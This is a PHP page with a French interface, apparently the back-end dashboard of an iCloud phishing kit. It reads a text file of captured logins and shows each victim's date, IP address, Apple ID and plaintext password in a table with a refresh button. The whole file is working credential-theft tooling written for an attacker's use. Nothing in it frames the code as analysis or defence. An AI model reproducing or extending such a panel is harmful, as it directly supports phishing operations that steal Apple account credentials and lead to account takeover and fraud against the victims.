<?php
$infoFile = 'info.txt';
$entries = [];
if (file_exists($infoFile)) {
    $entries = file($infoFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <title>Dashboard iCloud</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f2f2f2; padding: 20px; }
        h1 { text-align: center; color: #333; }
        table {
            width: 100%;
            max-width: 900px;
            margin: auto;
            border-collapse: collapse;
            background: white;
        }
        th, td {
            padding: 10px;
            border: 1px solid #ccc;
        }
        th {
            background: #007aff;
            color: white;
        }
        tr:nth-child(even) { background: #f9f9f9; }
        .btn-refresh {
            margin: 20px auto;
            display: block;
            background: #007aff;
            color: white;
            padding: 10px 20px;
            border: none;
            font-size: 16px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>Dashboard - Connexions iCloud Capturées</h1>
    <?php if (empty($entries)): ?>
        <p style="text-align:center;">Aucune donnée pour l’instant.</p>
    <?php else: ?>
        <table>
            <thead>
                <tr>
                    <th>Date</th>
                    <th>IP</th>
                    <th>Identifiant Apple</th>
                    <th>Mot de passe</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($entries as $line): ?>
                    <?php
                        $parts = explode('|', $line);
                        $date = trim($parts[0] ?? '');
                        $ip = trim($parts[1] ?? '');
                        $user = trim($parts[2] ?? '');
                        $pass = trim($parts[3] ?? '');
                    ?>
                    <tr>
                        <td><?= htmlspecialchars($date) ?></td>
                        <td><?= htmlspecialchars($ip) ?></td>
                        <td><?= htmlspecialchars($user) ?></td>
                        <td><?= htmlspecialchars($pass) ?></td>
                    </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        <button class="btn-refresh" onclick="location.reload()">Actualiser</button>
    <?php endif; ?>
</body>
</html>
